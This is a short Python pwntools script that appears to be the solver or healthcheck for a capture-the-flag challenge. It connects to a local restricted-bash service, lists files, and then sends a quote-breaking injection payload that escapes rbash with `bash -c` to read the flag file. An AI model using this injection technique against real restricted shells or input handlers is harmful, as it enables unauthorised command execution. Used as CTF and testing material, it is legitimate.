#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib

PROMPT = b'rbash$ '

# def handle_pow(r):
#     print(r.recvuntil(b'python3 '))
#     print(r.recvuntil(b' solve '))
#     challenge = r.recvline().decode('ascii').strip()
#     p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
#     solution = p.readall().strip()
#     r.sendline(solution)
#     print(r.recvuntil(b'Correct\n'))

r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
# print(r.recvuntil('== proof-of-work: '))
# if r.recvline().startswith(b'enabled'):
#     handle_pow(r)

r.recvuntil(PROMPT)
r.sendline('ls')
ls_result = r.recvuntil(PROMPT)
assert b'README' in ls_result, ls_result
assert b'bin' in ls_result, ls_result
assert b'opt' in ls_result, ls_result
print('ls:', ls_result)
r.sendline('cat README')
print('cat README:', r.recvuntil(PROMPT))

r.sendline("';bash -c 'cat opt/flag-b01d7291b94feefa35e6.txt")
print(r.recvuntil(b'sdctf{'))
print(r.recvuntil(b'}'))

exit(0)
